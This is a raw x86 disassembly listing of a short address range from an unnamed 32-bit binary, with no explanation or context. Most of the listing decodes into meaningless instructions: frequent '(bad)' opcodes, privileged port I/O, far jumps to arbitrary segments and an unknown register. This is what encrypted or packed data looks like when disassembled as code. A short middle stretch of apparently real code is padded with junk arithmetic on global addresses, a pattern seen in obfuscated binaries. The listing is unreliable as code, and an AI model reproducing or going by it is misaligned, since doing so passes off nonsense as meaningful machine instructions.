  40318d:	lea    eax,[eax+ecx*1-0x27d2]
  403194:	jmp    0x40371e
  403199:	out    0x30,al
  40319b:	dec    BYTE PTR [edi+0x18661839]
  4031a1:	lock push 0xf88672b2
  4031a7:	fsubr  DWORD PTR [eax+0x1616e1f4]
  4031ad:	cmp    eax,0x98161604
  4031b2:	int3   
  4031b3:	ficom  DWORD PTR ds:0x3f2fc5d8
  4031b9:	imul   ebx,DWORD PTR [eax],0x19
  4031bc:	and    eax,0xe8edbeee
  4031c1:	lock add al,BYTE PTR [edx+0x78e73e53]
  4031c8:	ficom  DWORD PTR [edx+0x43]
  4031cb:	adc    al,0xb9
  4031cd:	ja     0x403191
  4031cf:	jbe    0x403193
  4031d1:	mov    ebp,0x10e466d8
  4031d6:	mov    ah,0x36
  4031d8:	and    al,0xa8
  4031da:	pop    esp
  4031db:	lock xchg edx,eax
  4031dd:	dec    eax
  4031de:	xchg   ecx,eax
  4031df:	cdq    
  4031e0:	jecxz  0x403259
  4031e2:	and    BYTE PTR [ebx+ebx*4-0x44],0x3e
  4031e7:	scas   eax,DWORD PTR es:[edi]
  4031e8:	out    dx,al
  4031e9:	addr16 (bad) 
  4031ec:	fst    DWORD PTR [ecx+0x26]
  4031ef:	xchg   esi,eax
  4031f0:	mov    esi,0x90f7b567
  4031f5:	and    eax,0x621e3e78
  4031fa:	test   al,0x3f
  4031fc:	ret    
  4031fd:	xor    al,0xd6
  4031ff:	js     0x4031a3
  403201:	ss aas 
  403203:	adc    al,0xd3
  403205:	pop    esi
  403206:	mov    ch,0x27
  403208:	push   edi
  403209:	sub    edx,ecx
  40320b:	and    edi,DWORD PTR [esi+0x5a]
  40320e:	mov    al,ds:0x66699872
  403213:	jle    0x40319a
  403215:	ficomp WORD PTR [ebp+0x7b]
  403218:	sbb    DWORD PTR [edx+0x2],edi
  40321b:	shr    BYTE PTR [edi+0x50],1
  40321e:	int    0x47
  403220:	pop    es
  403221:	push   ebx
  403222:	mov    ah,0xca
  403224:	jmp    0xb2f2:0x8b26f79c
  40322b:	inc    ebp
  40322c:	add    dh,ah
  40322e:	add    al,0x59
  403230:	fmulp  st(6),st
  403232:	ins    BYTE PTR es:[edi],dx
  403233:	cwde   
  403234:	repnz stos BYTE PTR es:[edi],al
  403236:	dec    ebx
  403237:	js     0x40328f
  403239:	cmp    eax,0x7a5f471f
  40323e:	add    edx,esp
  403240:	mov    dl,0x85
  403242:	fidiv  DWORD PTR ds:0x9ffe4341
  403248:	adc    ecx,DWORD PTR [edi+0x68]
  40324b:	scas   eax,DWORD PTR es:[edi]
  40324c:	and    ecx,DWORD PTR [edi]
  40324e:	call   0x7bdb:0x978a204a
  403255:	fmul   QWORD PTR [ecx]
  403257:	mov    es,WORD PTR [esi-0x18564663]
  40325d:	mov    esi,edx
  40325f:	jle    0x403260
  403261:	and    al,bh
  403263:	pop    esp
  403264:	fnstsw WORD PTR [ebx]
  403266:	push   esi
  403267:	cmp    eax,0x29163aae
  40326c:	div    esi
  40326e:	adc    DWORD PTR [ecx+0x0],0xb827b50b
  403275:	(bad)  
  403277:	jae    0x403260
  403279:	fidivr WORD PTR [esi+0x44]
  40327c:	addr16 jmp 0x218f0ee3
  403282:	mov    cs,WORD PTR [ebx-0x2df8f95b]
  403288:	fcom   QWORD PTR [edx-0x4c784694]
  40328e:	inc    esi
  40328f:	mov    dl,cl
  403291:	inc    esi
  403292:	xor    DWORD PTR [edi-0x77],ebp
  403295:	stos   BYTE PTR es:[edi],al
  403296:	call   0xb682d457
  40329b:	inc    edx
  40329c:	xor    cl,BYTE PTR [ebx]
  40329e:	lahf   
  40329f:	push   es
  4032a0:	mov    bl,0x7
  4032a2:	push   0x49
  4032a4:	push   esi
  4032a5:	cmc    
  4032a6:	xchg   DWORD PTR [ecx+esi*1+0x796408f9],edx
  4032ad:	mov    eax,0x73da408
  4032b2:	lahf   
  4032b3:	add    ebp,esi
  4032b5:	inc    eax
  4032b6:	dec    esi
  4032b7:	and    DWORD PTR [ecx-0x1032e760],edx
  4032bd:	pop    ecx
  4032be:	sbb    ch,cl
  4032c0:	xchg   ebp,eax
  4032c1:	inc    ebx
  4032c2:	and    dl,BYTE PTR [edx+0x3e10631b]
  4032c8:	lods   eax,DWORD PTR ds:[esi]
  4032c9:	(bad)  
  4032ca:	push   0xffffffb6
  4032cc:	and    al,0x6b
  4032ce:	aad    0x7
  4032d0:	sub    edi,DWORD PTR [eax+0x44]
  4032d3:	test   al,0xc3
  4032d5:	into   
  4032d6:	aaa    
  4032d7:	ror    BYTE PTR [edx],1
  4032d9:	pusha  
  4032da:	out    dx,al
  4032db:	jae    0x4032ef
  4032dd:	cmp    BYTE PTR [edx],cl
  4032df:	pop    eax
  4032e0:	mov    ebx,0xc7c9252f
  4032e5:	popa   
  4032e6:	or     DWORD PTR [edi],0x313a99ae
  4032ec:	sbb    ah,BYTE PTR [ebx+0x5fc4d31c]
  4032f2:	imul   esi,DWORD PTR [edx+0x50d3d392],0x36
  4032f9:	in     al,dx
  4032fa:	sbb    edi,DWORD PTR ds:0x972f026a
  403300:	(bad)  
  403301:	ins    BYTE PTR es:[edi],dx
  403302:	xchg   ebx,eax
  403303:	and    DWORD PTR [edx+0x68],esi
  403306:	stos   BYTE PTR es:[edi],al
  403307:	push   0xffffff90
  403309:	mov    al,ds:0xf5d0393a
  40330e:	mov    bl,0xac
  403310:	jb     0x40336a
  403312:	sbb    BYTE PTR [esi+0x28],0x75
  403316:	jmp    0x403300
  403318:	or     bl,BYTE PTR [ebx+ecx*1+0x67]
  40331c:	shl    BYTE PTR [esi+0x5c2a693],0x11
  403323:	out    0x90,al
  403325:	push   es
  403326:	(bad)  
  403327:	mov    WORD PTR ss:[edx+0x41],cs
  40332b:	sbb    al,0xf8
  40332d:	aad    0xe8
  40332f:	adc    eax,0x263a02e5
  403334:	mov    ch,0xa4
  403336:	add    DWORD PTR [ecx],eax
  403338:	xor    cl,BYTE PTR [ebx]
  40333a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40333b:	mov    esp,0xa010125f
  403340:	pushf  
  403341:	adc    ah,BYTE PTR [ebx-0x7a]
  403344:	mov    edx,0x7bf3c576
  403349:	fimul  DWORD PTR [ebp+0x37a76c31]
  40334f:	or     eax,0x5ee98b4c
  403354:	mov    esi,0x17b22bdd
  403359:	sbb    ch,BYTE PTR [ebp-0x2b22e81f]
  40335f:	int3   
  403360:	xor    eax,0x793f0bd
  403365:	(bad)  
  403366:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403367:	pop    eax
  403368:	sub    cl,0xe1
  40336b:	in     eax,0x24
  40336d:	je     0x40335c
  40336f:	xor    BYTE PTR [ebx],al
  403371:	mov    es,WORD PTR [ecx+0x5d9fd7be]
  403377:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403378:	les    edi,FWORD PTR [eax]
  40337a:	outs   dx,BYTE PTR ds:[esi]
  40337b:	pusha  
  40337c:	call   DWORD PTR [edx-0x18]
  40337f:	ds pop ss
  403381:	stc    
  403382:	(bad)  
  403383:	xor    al,0x66
  403385:	xor    ebx,ecx
  403387:	add    eax,0x56885eec
  40338c:	and    BYTE PTR [edx],0x24
  40338f:	jmp    0x4033ae
  403391:	xchg   esp,eax
  403392:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403393:	pop    edx
  403394:	test   eax,0xaf0ffec1
  403399:	in     al,dx
  40339a:	leave  
  40339b:	addr16 mov ebp,0x65d359db
  4033a1:	clc    
  4033a2:	mov    eax,ds:0x4664fd08
  4033a7:	adc    dl,BYTE PTR [ecx-0x5d]
  4033aa:	call   0x206:0x91d9e20d
  4033b1:	adc    al,0xac
  4033b3:	lods   eax,DWORD PTR ds:[esi]
  4033b4:	fimul  DWORD PTR [esi-0x59991070]
  4033ba:	pop    edx
  4033bb:	ret    
  4033bc:	mov    edi,0xd1f94881
  4033c1:	ror    bl,cl
  4033c3:	ror    esi,1
  4033c5:	or     esp,DWORD PTR [ebx-0x2c59d303]
  4033cb:	adc    DWORD PTR [eax],0x35
  4033ce:	jecxz  0x403403
  4033d0:	ds push cs
  4033d2:	push   0x61
  4033d4:	adc    cl,BYTE PTR [ebp-0x2be5bae6]
  4033da:	out    dx,al
  4033db:	or     eax,0x7f76b6ec
  4033e0:	(bad)
  4033e4:	not    ebx
  4033e6:	mov    ss,WORD PTR [edi]
  4033e8:	popfw  
  4033ea:	push   0x2ab28f5e
  4033ef:	add    dl,BYTE PTR [eax]
  4033f1:	add    ah,BYTE PTR [ebx]
  4033f3:	push   0x62
  4033f5:	inc    ebx
  4033f6:	push   ds
  4033f7:	in     al,0x69
  4033f9:	jl     0x403419
  4033fb:	push   esp
  4033fc:	pop    ebx
  4033fd:	lahf   
  4033fe:	cld    
  4033ff:	adc    BYTE PTR [eax+0x502ad81d],dh
  403405:	call   0xf383:0xc738d2c
  40340c:	pop    ebp
  40340d:	xor    BYTE PTR [edx],0x5e
  403410:	ss into 
  403412:	mov    ecx,0xedc965f1
  403417:	mov    bl,0xce
  403419:	adc    ebx,ebp
  40341b:	in     al,dx
  40341c:	push   es
  40341d:	xor    eax,DWORD PTR [eax]
  40341f:	cli    
  403420:	scas   eax,DWORD PTR es:[edi]
  403421:	scas   al,BYTE PTR es:[edi]
  403422:	inc    esp
  403423:	xlat   BYTE PTR ds:[ebx]
  403424:	mov    eax,0x3d4bc63b
  403429:	rcr    BYTE PTR [ebx-0x3048b369],cl
  40342f:	pop    ebx
  403430:	push   ebx
  403431:	jp     0x4033bf
  403433:	lds    eax,FWORD PTR [ebp+ebp*4-0x3c]
  403437:	fprem1 
  403439:	inc    esi
  40343a:	test   BYTE PTR [eax-0x38],bl
  40343d:	lds    ebx,FWORD PTR [ebp+eax*2-0x2]
  403441:	adc    DWORD PTR [ecx],edx
  403443:	fisttp DWORD PTR [esi+0x7aff97ab]
  403449:	repnz ror esi,cl
  40344c:	dec    ebx
  40344d:	(bad)  
  40344e:	jo     0x40349c
  403450:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403451:	jo     0x40340b
  403453:	or     al,0xad
  403455:	mov    ecx,0xb5542fda
  40345a:	test   eax,0xa975e2fb
  40345f:	in     eax,dx
  403460:	cdq    
  403461:	(bad)  
  403462:	cmp    DWORD PTR [ebx],esi
  403464:	enter  0x1c06,0x34
  403468:	mov    bl,0x8e
  40346a:	mov    eax,ds:0x1366756e
  40346f:	fimul  DWORD PTR [edi+0x47]
  403472:	jge    0x403462
  403474:	iret   
  403475:	jge    0x4034a1
  403477:	jle    0x4034d1
  403479:	push   cs
  40347a:	pop    esi
  40347b:	in     al,0xc2
  40347d:	popa   
  40347e:	leave  
  40347f:	jns    0x403483
  403481:	or     eax,DWORD PTR [esi+eiz*2-0x40]
  403485:	mov    edi,0xd2c671c8
  40348a:	int    0x9e
  40348c:	push   edx
  40348d:	or     al,0xb8
  40348f:	xchg   esp,eax
  403490:	(bad)  
  403491:	jmp    0xa4f2bade
  403496:	xor    eax,0xd9bbb5df
  40349b:	ins    DWORD PTR es:[edi],dx
  40349c:	mov    esp,0xf2fd03dc
  4034a1:	or     ecx,0x3211ee4e
  4034a7:	jmp    0xd09a:0xfb3e911f
  4034ae:	clc    
  4034af:	nop
  4034b0:	and    al,0xba
  4034b2:	scas   eax,DWORD PTR es:[edi]
  4034b3:	mov    ecx,0x75dbf781
  4034b8:	cmp    eax,0x35429dbf
  4034bd:	outs   dx,BYTE PTR ds:[esi]
  4034be:	in     al,0x3e
  4034c0:	or     BYTE PTR [esi+0x33],al
  4034c3:	sub    DWORD PTR es:[esi+0x5c],edx
  4034c7:	(bad)  
  4034c8:	outs   dx,DWORD PTR ds:[esi]
  4034c9:	bound  eax,QWORD PTR [eax+0x72]
  4034cc:	ficomp DWORD PTR [ecx+ecx*1-0x5]
  4034d0:	aas    
  4034d1:	aam    0xa5
  4034d3:	or     ch,bl
  4034d5:	mov    ah,ah
  4034d7:	loopne 0x40351b
  4034d9:	xchg   esi,eax
  4034da:	dec    eax
  4034db:	cmp    edi,DWORD PTR [ecx]
  4034dd:	and    bl,dh
  4034df:	mov    BYTE PTR [edi],al
  4034e1:	cld    
  4034e2:	jb     0x40351f
  4034e4:	in     eax,0x17
  4034e6:	repz push cs
  4034e8:	push   ecx
  4034e9:	sub    eax,0xe8abed64
  4034ee:	pop    eax
  4034ef:	(bad)  
  4034f0:	pushf  
  4034f1:	dec    ebx
  4034f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034f3:	sbb    edi,edi
  4034f5:	xor    BYTE PTR [edi-0x4e],bh
  4034f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034f9:	jbe    0x403551
  4034fb:	dec    esp
  4034fc:	jb     0x403559
  4034fe:	lods   eax,DWORD PTR ds:[esi]
  4034ff:	xchg   edi,eax
  403500:	sbb    BYTE PTR ds:0xba8be6f9,dl
  403506:	rcl    DWORD PTR [ecx+edi*8],cl
  403509:	add    al,0xf2
  40350b:	cld    
  40350c:	jg     0x40356b
  40350e:	ins    DWORD PTR es:[edi],dx
  40350f:	mov    edx,0x803b7382
  403514:	rol    DWORD PTR [edi+0x5],0xb0
  403518:	push   ds
  403519:	dec    ebp
  40351a:	sbb    DWORD PTR [esi+0x64370640],edx
  403520:	sbb    bh,cl
  403522:	mov    ds:0x20dff7b2,al
  403527:	dec    eax
  403528:	shl    BYTE PTR [eax-0x4d12ab03],1
  40352e:	xor    DWORD PTR [ecx],ebp
  403530:	aam    0x8a
  403532:	push   cs
  403533:	or     bl,dl
  403535:	push   edx
  403536:	xchg   BYTE PTR [ecx],cl
  403538:	es push edi
  40353a:	sub    DWORD PTR [edx],edi
  40353c:	xor    al,0x64
  40353e:	dec    esi
  40353f:	fadd   DWORD PTR [eax-0x4c]
  403542:	sbb    DWORD PTR [ebx-0x7993a3e3],ecx
  403548:	dec    ebx
  403549:	(bad)  
  40354a:	cmp    DWORD PTR [ecx+ebx*8],ebp
  40354d:	mov    dl,0xdf
  40354f:	sbb    edi,DWORD PTR [edi+0x56]
  403552:	das    
  403553:	lods   al,BYTE PTR ds:[esi]
  403554:	(bad)  
  403555:	ror    DWORD PTR es:[ecx-0x6a85bb20],cl
  40355c:	js     0x403576
  40355e:	push   eax
  40355f:	jne    0x4035a7
  403561:	xlat   BYTE PTR ds:[ebx]
  403562:	imul   edx,ecx,0x7e33b54b
  403568:	or     eax,0x8c655a54
  40356d:	mov    cl,0x7e
  40356f:	jno    0x403534
  403571:	popf   
  403572:	cli    
  403573:	pop    esp
  403574:	enter  0xbf54,0x48
  403578:	enter  0xcc38,0x99
  40357c:	push   0xffffffdd
  40357e:	jb     0x403539
  403580:	jb     0x40354e
  403582:	out    dx,eax
  403583:	or     DWORD PTR [edi+edi*4+0xf6bad0b],ebp
  40358a:	push   ss
  40358b:	pop    edi
  40358c:	lea    edx,[ecx]
  40358e:	call   0x65f8:0x8b527b2
  403595:	jae    0x40359c
  403597:	xchg   ebx,eax
  403598:	add    eax,0xf115c645
  40359d:	adc    DWORD PTR [edx-0x7b15c01e],edi
  4035a3:	mov    eax,0x9e2332b2
  4035a8:	stos   DWORD PTR es:[edi],eax
  4035a9:	adc    eax,0xc303c55d
  4035ae:	sbb    cl,BYTE PTR [edi]
  4035b0:	psubsb mm2,QWORD PTR [ebx+eax*4-0x5e]
  4035b5:	xchg   DWORD PTR [ebp-0x44827013],esi
  4035bb:	cmp    al,0x58
  4035bd:	mov    dh,0x4a
  4035bf:	mov    ch,al
  4035c1:	je     0x403607
  4035c3:	cld    
  4035c4:	or     al,0x4c
  4035c6:	lea    ecx,[edi]
  4035c8:	int    0x68
  4035ca:	and    BYTE PTR [ebp-0x287c8da4],bh
  4035d0:	enter  0xa0a6,0x1f
  4035d4:	cld    
  4035d5:	sbb    BYTE PTR [edi],ch
  4035d7:	hlt    
  4035d8:	sub    ecx,eax
  4035da:	int    0xb0
  4035dc:	in     eax,0xcb
  4035de:	sti    
  4035df:	push   0xd
  4035e1:	dec    ecx
  4035e2:	iret   
  4035e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035e4:	sub    eax,0xa7f7ca92
  4035e9:	lods   al,BYTE PTR ds:[esi]
  4035ea:	out    dx,al
  4035eb:	loope  0x4035a1
  4035ed:	dec    edi
  4035ee:	dec    edi
  4035ef:	mov    bl,0xad
  4035f1:	add    DWORD PTR [ebx-0x7],ecx
  4035f4:	pusha  
  4035f5:	xchg   ebx,eax
  4035f6:	mov    edi,0x494ea137
  4035fb:	adc    eax,0x88358c6
  403600:	jmp    0x8b26:0x9c9f1a9
  403607:	outs   dx,DWORD PTR ds:[esi]
  403608:	rcl    BYTE PTR [ecx],0x26
  40360b:	fwait
  40360c:	jns    0x40367d
  40360e:	sbb    edi,edi
  403610:	js     0x4035df
  403612:	lods   eax,DWORD PTR ds:[esi]
  403613:	sti    
  403614:	inc    ebp
  403615:	bound  ecx,QWORD PTR [edi+0x75eb8280]
  40361b:	cs push eax
  40361d:	inc    esp
  40361e:	cmp    al,0x6
  403620:	pop    ds
  403621:	loopne 0x40366b
  403623:	pop    esp
  403624:	push   ds
  403625:	sub    esp,DWORD PTR [ebp+0x1e]
  403628:	data16 aas 
  40362a:	call   0x6491:0xe616ca9b
  403631:	jg     0x4035bf
  403633:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403634:	pop    edi
  403635:	sub    BYTE PTR [eax+0x3e],0x56
  403639:	xor    dh,BYTE PTR [ebp-0x35b73419]
  40363f:	mov    bl,0xa6
  403641:	retf   0x44d2
  403644:	push   ds
  403645:	dec    ecx
  403646:	ret    0xd84e
  403649:	call   0x44a9eb96
  40364e:	ins    DWORD PTR es:[edi],dx
  40364f:	iret   
  403650:	add    al,0xc2
  403652:	ret    
  403653:	in     al,0x60
  403655:	addr16 popa 
  403657:	(bad)  
  403658:	imul   esi,DWORD PTR [ecx+0x74],0x5a5afd63
  40365f:	mov    bh,BYTE PTR [ebp+0x2de648f2]
  403665:	ret    0xf1d
  403668:	test   DWORD PTR [edi+edx*4],edx
  40366b:	lods   eax,DWORD PTR ds:[esi]
  40366c:	and    BYTE PTR [esi+0x2d],0xfd
  403670:	dec    esp
  403671:	jmp    DWORD PTR [edi]
  403673:	add    dl,BYTE PTR [ecx-0x3efd3069]
  403679:	mov    esp,0x30856c40
  40367e:	mov    ebp,0x993b2f89
  403683:	sub    bh,BYTE PTR [ecx+0x44]
  403686:	mov    esp,0x7ea8f3b4
  40368b:	ror    BYTE PTR [edi+0x4519ecde],0xc9
  403692:	call   0x90cc9013
  403697:	ds and al,0x6e
  40369a:	lahf   
  40369b:	ins    BYTE PTR es:[edi],dx
  40369c:	and    al,0x1
  40369f:	or     ch,bh
  4036a1:	lods   eax,DWORD PTR ds:[esi]
  4036a2:	jmp    0x74593962
  4036a7:	and    eax,DWORD PTR [edx]
  4036a9:	pusha  
  4036aa:	mov    ds:0xe7ca1f4f,eax
  4036af:	dec    edx
  4036b0:	xchg   ebx,eax
  4036b1:	test   ah,bl
  4036b3:	int    0x0
  4036b5:	outs   dx,BYTE PTR ds:[esi]
  4036b6:	cmp    eax,ecx
  4036b8:	pop    esi
  4036b9:	hlt    
  4036ba:	lahf   
  4036bb:	xchg   ebp,eax
  4036bc:	sub    BYTE PTR [ebp-0x3e154cdb],ah
  4036c2:	dec    edx
  4036c3:	stos   DWORD PTR es:[edi],eax
  4036c4:	push   0x33300119
  4036c9:	clc    
  4036ca:	idiv   DWORD PTR [ebx+0x6c]
  4036cd:	fbstp  TBYTE PTR gs:[edi+0x8a0a27a]
  4036d4:	retf   0x94ad
  4036d7:	add    cl,BYTE PTR [ebx]
  4036d9:	mov    ecx,0x643fe3a3
  4036de:	mov    ecx,0x738662c2
  4036e3:	push   ecx
  4036e4:	scas   eax,DWORD PTR es:[edi]
  4036e5:	inc    esp
  4036e6:	div    DWORD PTR [ecx-0x30]
  4036e9:	pusha  
  4036ea:	cmp    dh,BYTE PTR [esi]
  4036ec:	pop    edi
  4036ed:	jbe    0x403672
  4036ef:	jge    0x403754
  4036f1:	mov    ds:0xc3cdd29f,eax
  4036f6:	rol    DWORD PTR [ebp+0x444098a],1
  4036fc:	int    0x4d
  4036fe:	mov    ?,WORD PTR [edi+0x1]
  403701:	xor    edx,DWORD PTR [edi+0x63]
  403704:	fisttp DWORD PTR [edi+0x7166a574]
  40370a:	ret    0xd096
  40370d:	and    dl,BYTE PTR [ecx]
  40370f:	stos   DWORD PTR es:[edi],eax
  403710:	das    
  403711:	adc    al,0x1a
  403713:	xchg   esp,eax
  403714:	dec    esp
  403715:	inc    eax
  403716:	mov    ah,0xe5
  403718:	cmp    DWORD PTR [ebx+esi*4-0x6f],0x4d8b6005
  403720:	in     al,0x83
  403722:	cmp    eax,0x42291a
  403727:	add    bh,dh
  403729:	adc    eax,0x42292a
  40372e:	mov    edx,0x5d13
  403733:	movzx  edx,WORD PTR ds:0x42288a
  40373a:	jmp    0x403780
  40373f:	mov    DWORD PTR ds:0x4229aa,0xf15
  403749:	jg     0x40376e
  40374f:	push   DWORD PTR [ebp-0xc]
  403752:	call   DWORD PTR ds:0x42a174
  403758:	add    DWORD PTR ds:0x4228d2,ebx
  40375e:	xor    DWORD PTR ds:0x42296a,edi
  403764:	sub    DWORD PTR ds:0x4228ea,0x49b7
  40376e:	sub    edx,DWORD PTR ds:0x4228ca
  403774:	or     DWORD PTR ds:0x4228ce,edi
  40377a:	xor    DWORD PTR ds:0x4228f2,ebx
  403780:	mov    edx,DWORD PTR [ebp-0x2c]
  403783:	or     DWORD PTR ds:0x422942,0x4409
  40378d:	or     ecx,0x4f00
  403793:	and    ecx,edx
  403795:	mov    edx,DWORD PTR ds:0x422892
  40379b:	adc    edx,DWORD PTR ds:0x4229b6
  4037a1:	mov    DWORD PTR ds:0x422892,edx
  4037a7:	mov    edx,DWORD PTR [ebp-0x34]
  4037aa:	adc    DWORD PTR ds:0x4229b2,0x1e82
  4037b4:	or     ecx,edx
  4037b6:	adc    DWORD PTR ds:0x4228ba,0x5785
  4037c0:	xor    ecx,0x5fdd
  4037c6:	cmp    ecx,DWORD PTR [eax]
  4037c8:	jne    0x41a17f
  4037ce:	and    DWORD PTR ds:0x42297a,0x68cd
  4037d8:	mov    ecx,DWORD PTR [esi]
  4037da:	sub    DWORD PTR ds:0x42297a,0x1779
  4037e4:	mov    eax,DWORD PTR [esi+0x4]
  4037e7:	and    edx,0xf6b
  4037ed:	shrd   ecx,eax,0x2
  4037f1:	shr    eax,0x2
  4037f4:	sbb    edx,DWORD PTR ds:0x4228e2
  4037fa:	mov    eax,DWORD PTR [esi]
  4037fc:	and    edx,DWORD PTR ds:0x4229d2
  403802:	mov    edx,DWORD PTR [esi+0x4]
  403805:	shl    eax,0x1e
  403808:	add    DWORD PTR ds:0x4229ae,0x4229ca
  403812:	xor    ecx,edi
  403814:	sub    DWORD PTR ds:0x42292a,0x2cc5
  40381e:	jmp    0x403da8
  403823:	add    al,0xf4
  403825:	sbb    al,0x30
  403827:	sbb    al,0x28
  403829:	clc    
  40382a:	sbb    BYTE PTR [ecx+edi*2],ch
  40382d:	jb     0x4038a1
  40382f:	(bad)
  403833:	and    edx,edi
  403835:	push   ss
  403836:	push   ss
  403837:	cmp    eax,0x161604
  40383c:	mov    bh,0x1a
  40383e:	adc    eax,0xe5ba426d
  403843:	push   cs
  403844:	xchg   esp,ecx
  403846:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403847:	jle    0x403880
  403849:	and    al,0x32
  40384b:	in     eax,0xd4
  40384d:	int3   
  40384e:	sub    BYTE PTR [eax-0x18],dh
  403851:	outs   dx,BYTE PTR ds:[esi]
  403852:	inc    edi
  403853:	adc    eax,0xa9a9ab6b
  403858:	xchg   BYTE PTR [ecx+0x77],bh
  40385b:	push   ecx
  40385c:	push   ebx
  40385d:	xchg   ecx,eax
  40385e:	or     ebx,DWORD PTR [edi-0x4b]
  403861:	test   BYTE PTR [esi+0x5342dfbc],dl
  403867:	in     eax,dx
  403868:	je     0x4038c3
  40386a:	mov    BYTE PTR [ebx],0x1c
  40386d:	pop    ss
  40386e:	or     eax,0x869241d8
  403873:	dec    edi
  403874:	fldcw  WORD PTR [eax]
  403876:	scas   al,BYTE PTR es:[edi]
  403877:	xlat   BYTE PTR ds:[ebx]
  403878:	and    BYTE PTR [edi],dl
  40387a:	push   cs
  40387b:	sbb    BYTE PTR [edi+edi*1+0x53010610],al
  403882:	or     BYTE PTR [edi+0x21b129],ah
  403888:	cmp    DWORD PTR [edi],eax
  40388a:	lahf   
  40388b:	sub    eax,0x78befb87
  403890:	shl    DWORD PTR [ecx],1
  403892:	add    dl,cl
  403894:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403895:	adc    DWORD PTR ds:0x5208d4a0,ecx
  40389b:	cs xchg esp,eax
  40389d:	push   ebp
  40389e:	stc    
  40389f:	xchg   edi,eax
  4038a0:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4038a2:	pop    ss
  4038a3:	std    
  4038a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4038a5:	xlat   BYTE PTR ds:[ebx]
  4038a6:	cwde   
  4038a7:	mov    cl,0xe2
  4038a9:	inc    ecx
  4038aa:	scas   al,BYTE PTR es:[edi]
  4038ab:	lahf   
  4038ac:	sbb    ecx,DWORD PTR [edx]
  4038ae:	pop    esp
  4038af:	lahf   
  4038b0:	arpl   di,dx
  4038b2:	mov    dh,0x2
  4038b4:	(bad)  
  4038b5:	into   
  4038b6:	or     DWORD PTR [edi+0x5eece9d7],edi
  4038bc:	jns    0x403932
  4038be:	es sub al,0x8c
  4038c1:	lods   al,BYTE PTR ds:[esi]
  4038c2:	adc    BYTE PTR [ecx-0x544a4f75],ah
  4038c8:	mov    ebx,0x3a8e0b66
  4038cd:	and    al,0x44
  4038cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038d0:	cmp    eax,0x82abd3f3
  4038d5:	jmp    0x7f38:0xe76fcd7f
  4038dc:	jmp    0x4038af
  4038de:	xlat   BYTE PTR ds:[ebx]
  4038df:	jns    0x40388b
  4038e1:	leave  
  4038e2:	push   ss
  4038e3:	xchg   edi,eax
  4038e4:	push   ebp
  4038e6:	retf   
  4038e7:	and    DWORD PTR [esi-0x58],0x1e
  4038eb:	or     cl,ch
  4038ed:	mov    esp,0x13477d4b
  4038f2:	mov    al,0xcd
  4038f4:	ins    DWORD PTR es:[edi],dx
  4038f5:	or     dl,BYTE PTR [ecx+0x4b178177]
  4038fb:	or     esp,DWORD PTR [ebx+0x3bf8c546]
  403901:	test   al,0xec
  403903:	rcl    BYTE PTR [eax],cl
  403905:	sub    al,0x2d
  403907:	mov    dl,0x3b
  403909:	setge  BYTE PTR [ecx]
  40390c:	mov    bl,0x5a
  40390e:	xor    BYTE PTR [edx],0x3d
  403911:	shl    DWORD PTR [ebx+eiz*4],0xf5
  403915:	pop    eax
  403916:	and    bh,dl
  403918:	inc    ebp
  403919:	cwde   
  40391a:	cmc    
  40391b:	or     BYTE PTR [esi+0x17],0xd1
  40391f:	and    bh,al
  403921:	hlt    
  403922:	mov    esi,DWORD PTR [esi]
  403924:	push   esp
  403925:	mov    eax,ds:0x3d71b81a
  40392a:	retf   0xf9fc
  40392d:	bound  esi,QWORD PTR [edx-0x2c]
  403930:	mov    ebx,esp
  403932:	inc    edx
  403933:	add    esp,esi
  403935:	data16 jae 0x40393f
  403938:	(bad)  
  403939:	out    dx,al
  40393a:	push   edx
  40393b:	cmp    al,0x72
  40393d:	mov    edi,0xf5b59e3d
  403942:	int3   
  403943:	ins    BYTE PTR es:[edi],dx
  403944:	(bad)  
  403945:	mov    edi,0x8132e167
  40394a:	addr16 sub al,0xcc
  40394d:	(bad)  
  40394f:	mov    ds:0x2a384623,eax
  403954:	loope  0x4039a3
  403956:	arpl   di,si
  403958:	jb     0x403950
  40395a:	mov    ch,0x16
  40395c:	jbe    0x403978
  40395e:	add    BYTE PTR [eax-0x64f40a85],bh
  403964:	in     eax,0xa0
  403966:	or     DWORD PTR [ebx],ecx
  403968:	push   edx
  403969:	inc    ebx
  40396a:	or     edx,esp
  40396c:	cmp    al,0x9b
  40396e:	jno    0x403981
  403970:	in     eax,0xb9
  403972:	(bad)  
  403973:	rcr    BYTE PTR [ecx+0x16],0xd9
  403977:	xlat   BYTE PTR ds:[ebx]
  403978:	adc    dh,al
  40397a:	ja     0x4039dc
  40397c:	or     esi,edx
  40397e:	js     0x40391c
  403980:	cmp    eax,0x1b6c7e35
  403985:	mov    edi,0x59ef866d
  40398a:	sub    DWORD PTR [edx],ecx
  40398c:	mov    esp,ebp
  40398e:	mov    dl,0x52
  403990:	push   edx
  403991:	sub    dh,BYTE PTR [eax]
  403993:	push   esi
  403994:	mov    bh,0x31
  403996:	out    dx,al
  403997:	popf   
  403998:	es push edx
  40399a:	adc    BYTE PTR [edx+0x23895e56],0x32
  4039a1:	sub    BYTE PTR [esi-0x322143b3],al
  4039a7:	fs fwait
  4039a9:	add    dl,BYTE PTR [ebx-0x3a]
  4039ac:	mov    dh,0xa
  4039ae:	(bad)  
  4039af:	xor    ebp,edx
  4039b1:	or     dh,al
  4039b3:	(bad)  
  4039b5:	dec    ebp
  4039b6:	adc    bl,cl
  4039b8:	xor    BYTE PTR [ebp+0x64],dl
  4039bb:	popa   
  4039bc:	mov    ah,0x37
  4039be:	neg    DWORD PTR [edi-0x79abbfec]
  4039c4:	xor    DWORD PTR [ecx-0x43],ebx
  4039c7:	sti    
  4039c8:	(bad)  
  4039c9:	cmp    BYTE PTR [edx+ebp*4],ah
